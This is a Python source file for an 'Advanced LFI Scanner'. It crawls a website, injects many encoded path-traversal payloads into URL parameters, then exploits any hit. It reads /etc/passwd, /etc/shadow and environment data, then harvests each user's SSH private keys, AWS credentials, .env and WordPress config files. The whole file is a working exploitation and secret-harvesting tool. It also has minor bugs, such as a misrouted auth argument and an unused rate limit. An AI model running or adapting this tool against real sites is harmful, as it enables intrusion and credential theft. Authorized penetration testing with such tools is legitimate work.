import argparse
import requests
import urllib3
import json
import csv
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import sys
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class EnhancedLFIScanner:
    def __init__(self, proxy=None, threads=10, wordlist=None, cookies=None, 
                 headers=None, timeout=15, rate_limit=0, auth=None):
        self.unique_entries = set()
        self.session = self._create_session(proxy, headers, auth)
        self.payloads = self._generate_payloads()
        self.exploit_files = self._load_exploit_wordlist(wordlist)
        self.user_file_patterns = self._load_user_patterns()
        self.visited_urls = set()
        self.tested_combinations = set()
        self.vulnerabilities = []
        self.exploitation_results = []
        self.threads = threads
        self.timeout = timeout
        self.rate_limit = rate_limit
        self.base_domain = None
        self.executor = ThreadPoolExecutor(max_workers=threads)
        self.lock = threading.Lock()
        self.auth = auth
        self.cookies = cookies  # Initialize cookies attribute    
    def _create_session(self, proxy, headers, cookies):
        """Configure HTTP session with retries and headers."""
        session = requests.Session()
        session.verify = False  # Disable SSL verification
        retries = Retry(total=3, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
        session.mount('https://', HTTPAdapter(max_retries=retries))
        session.mount('http://', HTTPAdapter(max_retries=retries))
        session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        if cookies:
            cookie_dict = {}
            for cookie in cookies.split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    cookie_dict[name] = value
            session.cookies.update(cookie_dict)
        if proxy:
            if not proxy.startswith(('http://', 'https://')):
                proxy = f'http://{proxy}'
            session.proxies = {'http': proxy, 'https': proxy}
        return session

    def _generate_payloads(self):
        base_payloads = [
            '{traversal}/etc/passwd',
            '{traversal}/etc/passwd%00',
            '{traversal}/etc/passwd%00.html',
            '{traversal}/etc/passwd{dot_extensions}',
            '{traversal}/windows/win.ini',
            '{traversal}/winnt/win.ini',
            '{traversal}/Windows/System32/drivers/etc/hosts',
            '{traversal}/././etc/passwd',
            '{traversal}/..././etc/passwd',
            '{traversal}/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '{traversal}/%252e%252e%252f' * 6 + 'etc/passwd',
            '{traversal}/%c0%ae%c0%ae%c0%af' * 6 + 'etc/passwd',
        ]
        
        traversal_sequences = [
            '../../../' * 6,
            '....//' * 6,
            '..%2f' * 6,
            '..;' * 6,
            '..%5c' * 6,
            '..%255c' * 6,
            '..%252f' * 6,
        ]
        
        dot_extensions = ['', '.php', '.html', '.jpg', '.png']
        
        payloads = []
        for payload in base_payloads:
            for traversal in traversal_sequences:
                for ext in dot_extensions:
                    formatted = payload.format(
                        traversal=traversal,
                        dot_extensions=ext
                    )
                    payloads.append(quote(formatted))
                    payloads.append(formatted)
        
        return list(set(payloads))

    def _load_exploit_wordlist(self, wordlist_path):
        default_files = [
            '/etc/passwd', '/etc/shadow', '/etc/hosts',
            '/Windows/System32/drivers/etc/hosts',
            '/proc/self/environ', '/var/log/apache/access.log'
        ]
        
        if not wordlist_path:
            return default_files
            
        try:
            with open(wordlist_path) as f:
                custom_files = [
                    line.strip() 
                    for line in f 
                    if line.strip() and not line.startswith('#')
                ]
                normalized = [
                    f'/{path.lstrip("/")}' if not path.startswith('/') else path
                    for path in custom_files
                ]
                combined = default_files + normalized
                seen = set()
                return [x for x in combined if not (x in seen or seen.add(x))]
        except Exception as e:
            print(f"[!] Wordlist error: {str(e)}")
            return default_files

    def _load_user_patterns(self):
        return [
            '.bash_history',
            '.ssh/id_rsa',
            '.ssh/authorized_keys',
            '.mysql_history',
            '.aws/credentials',
            '.env',
            'config.php',
            'wp-config.php'
        ]

    def scan(self, start_url):
        self.base_domain = urlparse(start_url).netloc
        self._crawl(start_url)
        self._exploit_vulnerabilities()
        return self.vulnerabilities + self.exploitation_results

    def _crawl(self, url):
        if url in self.visited_urls:
            return
        self.visited_urls.add(url)
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            soup = BeautifulSoup(response.text, 'html.parser')
            elements = soup.find_all(['a', 'form', 'link', 'script', 'img'])
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [
                    executor.submit(self._process_element, element, url)
                    for element in elements
                ]
                for future in as_completed(futures):
                    future.result()
                    
            self._analyze_parameters(url)
        except Exception as e:
            print(f"[-] Crawling error: {str(e)}")

    def _process_element(self, element, base_url):
        element_types = {
            'a': 'href', 'form': 'action', 
            'link': 'href', 'script': 'src', 
            'img': 'src'
        }
        attr = element_types.get(element.name)
        if not attr:
            return
            
        url = element.get(attr)
        if url:
            absolute_url = urljoin(base_url, url).split('#')[0]
            parsed = urlparse(absolute_url)
            if parsed.netloc == self.base_domain:
                normalized = parsed._replace(
                    path=parsed.path.rstrip('/'),
                    query=parsed.query.strip()
                ).geturl()
                if normalized not in self.visited_urls:
                    self._analyze_parameters(normalized)
                    self._crawl(normalized)

    def _analyze_parameters(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for param in params:
                for payload in self.payloads:
                    combination = (url, param, payload)
                    if combination not in self.tested_combinations:
                        self.tested_combinations.add(combination)
                        futures.append(executor.submit(
                            self._test_parameter, url, param, payload
                        ))
            for future in as_completed(futures):
                if result := future.result():
                    self._add_entry(result)

    def _test_parameter(self, original_url, param, payload):
        try:
            parsed = urlparse(original_url)
            query = parse_qs(parsed.query)
            test_params = parse_qs(parsed.query)
            test_params[param] = [payload]
            
            test_url = parsed._replace(query="&".join(
                [f"{k}={v[0]}" for k, v in test_params.items()]
            )).geturl()
            
            response = self.session.get(test_url, timeout=self.timeout)
            
            if self._is_vulnerable(response):
                return {
                    'type': 'discovery',
                    'url': test_url,
                    'parameter': param,
                    'payload': payload,
                    'os': self._detect_os(response),
                    'status': response.status_code,
                    'length': len(response.text),
                    'timestamp': datetime.now().isoformat()
                }
        except Exception as e:
            print(f"[-] Test failed: {str(e)}")
        return None

    def _is_vulnerable(self, response):
        content = response.text.lower()
        indicators = {
            'unix': ['root:x:', 'bin:x:', 'daemon:x:'],
            'windows': ['[boot loader]', '[extensions]'],
            'php': ['<?php', '<?='],
            'generic': ['file not found', 'permission denied']
        }
        
        if response.status_code not in [200, 500]:
            return False
            
        for os_type, patterns in indicators.items():
            if any(p in content for p in patterns):
                return True
                
        if len(response.text) > 1000 and 'html' not in response.headers.get('content-type', ''):
            return True
            
        return False

    def _detect_os(self, response):
        content = response.text.lower()
        if any(p in content for p in ['root:x:', 'bin:x:']):
            return 'unix'
        elif any(p in content for p in ['[boot loader]', '[extensions]']):
            return 'windows'
        return 'unknown'

    def _exploit_vulnerabilities(self):
        if not self.vulnerabilities:
            return
            
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for vuln in self.vulnerabilities:
                for target_file in self.exploit_files:
                    futures.append(executor.submit(
                        self._test_exploit,
                        vuln['url'], vuln['parameter'], 
                        vuln['payload'], target_file
                    ))
            for future in as_completed(futures):
                if result := future.result():
                    self._add_entry(result)

    def _test_exploit(self, original_url, param, base_payload, target_file):
        try:
            exploit_payload = self._generate_exploit_payload(base_payload, target_file)
            parsed = urlparse(original_url)
            query = parse_qs(parsed.query)
            query[param] = [exploit_payload]
            
            test_url = parsed._replace(query="&".join(
                [f"{k}={v[0]}" for k, v in query.items()]
            )).geturl()
            
            response = self.session.get(test_url, timeout=self.timeout)
            
            if self._is_valid_exploitation(response):
                content = response.text[:500] + '...' if response.text else ''
                result = {
                    'type': 'exploitation',
                    'url': test_url,
                    'parameter': param,
                    'target_file': target_file,
                    'payload': exploit_payload,
                    'content': content,
                    'status': response.status_code,
                    'length': len(response.text),
                    'timestamp': datetime.now().isoformat()
                }
                if target_file == '/etc/passwd':
                    self._process_passwd_content(content)
                return result
        except Exception as e:
            print(f"[-] Exploit failed: {str(e)}")
        return None

    def _generate_exploit_payload(self, base_payload, target_file):
        decoded = unquote(base_payload)
        modified = re.sub(r'(?:etc\/passwd|win\.ini)', target_file.lstrip('/'), decoded)
        return quote(modified)

    def _is_valid_exploitation(self, response):
        if response.status_code != 200:
            return False
        content = response.text.lower()
        error_indicators = ['file not found', 'permission denied']
        return not any(err in content for err in error_indicators) and bool(content)

    def _process_passwd_content(self, content):
        users = []
        for line in content.split('\n'):
            if line.strip() and not line.startswith('#'):
                parts = line.split(':')
                if len(parts) > 5:
                    username = parts[0]
                    home_dir = parts[5]
                    if home_dir.startswith('/home/'):
                        users.append({'name': username, 'home': home_dir})
        self._generate_user_files(users)

    def _generate_user_files(self, users):
        for user in users:
            for pattern in self.user_file_patterns:
                user_path = pattern.replace('~/', f"{user['home']}/")
                if user_path not in self.exploit_files:
                    self.exploit_files.append(user_path)

    def _add_entry(self, entry):
        entry_hash = hash(frozenset({
            'url': entry.get('url'),
            'parameter': entry.get('parameter'),
            'payload': unquote(entry.get('payload', '')),
            'target_file': entry.get('target_file', ''),
            'type': entry.get('type', 'discovery')
        }.items()))
        
        with self.lock:
            if entry_hash not in self.unique_entries:
                self.unique_entries.add(entry_hash)
                if entry.get('type') == 'exploitation':
                    self.exploitation_results.append(entry)
                else:
                    self.vulnerabilities.append(entry)

def main():
    parser = argparse.ArgumentParser(
        description="Advanced LFI Scanner - Detect and exploit path traversal vulnerabilities",
        epilog="Example: %(prog)s -u https://example.com -p 127.0.0.1:8080 -t 20 -o json"
    )
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single target URL")
    group.add_argument("-l", "--url-list", help="File containing list of URLs to test")
    parser.add_argument("-w", "--wordlist", help="Custom file path wordlist for exploitation")
    parser.add_argument("-p", "--proxy", help="Proxy server (e.g., 127.0.0.1:8080)")
    parser.add_argument("-o", "--output", choices=['json', 'csv'], help="Output format")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--cookies", help="Session cookies (name1=value1; name2=value2)")
    parser.add_argument("--headers", help="Custom HTTP headers in JSON format")
    parser.add_argument("--auth", help="Basic auth credentials (user:pass)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    parser.add_argument("--rate-limit", type=int, default=0, help="Delay between requests in milliseconds")
    
    args = parser.parse_args()
    
    auth = None
    if args.auth:
        user, password = args.auth.split(':', 1)
        auth = (user, password)
    
    scanner = EnhancedLFIScanner(
        proxy=args.proxy,
        threads=args.threads,
        wordlist=args.wordlist,
        cookies=args.cookies,
        headers=json.loads(args.headers) if args.headers else None,
        timeout=args.timeout,
        rate_limit=args.rate_limit,
        auth=auth
    )
    
    all_results = []
    
    try:
        if args.url:
            start_urls = [args.url]
        else:
            with open(args.url_list) as f:
                start_urls = [line.strip() for line in f if line.strip()]
        
        for url in start_urls:
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                print(f"[-] Skipping invalid URL: {url}")
                continue
                
            print(f"[+] Scanning: {url}")
            results = scanner.scan(url)
            all_results.extend(results)
            
            scanner.visited_urls.clear()
            scanner.tested_combinations.clear()
            scanner.vulnerabilities.clear()
            scanner.exploitation_results.clear()
            scanner.base_domain = None
    
        if args.output:
            output_file = f"lfi_report.{args.output}"
            if args.output == 'json':
                with open(output_file, 'w') as f:
                    json.dump(all_results, f, indent=2)
            elif args.output == 'csv':
                with open(output_file, 'w', newline='') as f:
                    writer = csv.DictWriter(f, fieldnames=[
                        'type', 'url', 'parameter', 'payload', 
                        'target_file', 'status', 'length', 
                        'content', 'timestamp', 'os'
                    ])
                    writer.writeheader()
                    writer.writerows(all_results)
            print(f"\n[*] Report saved to {output_file}")
    
        print(f"\n[*] Scan completed. Found {len(all_results)} results.")
    
    except Exception as e:
        print(f"[!] Critical error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
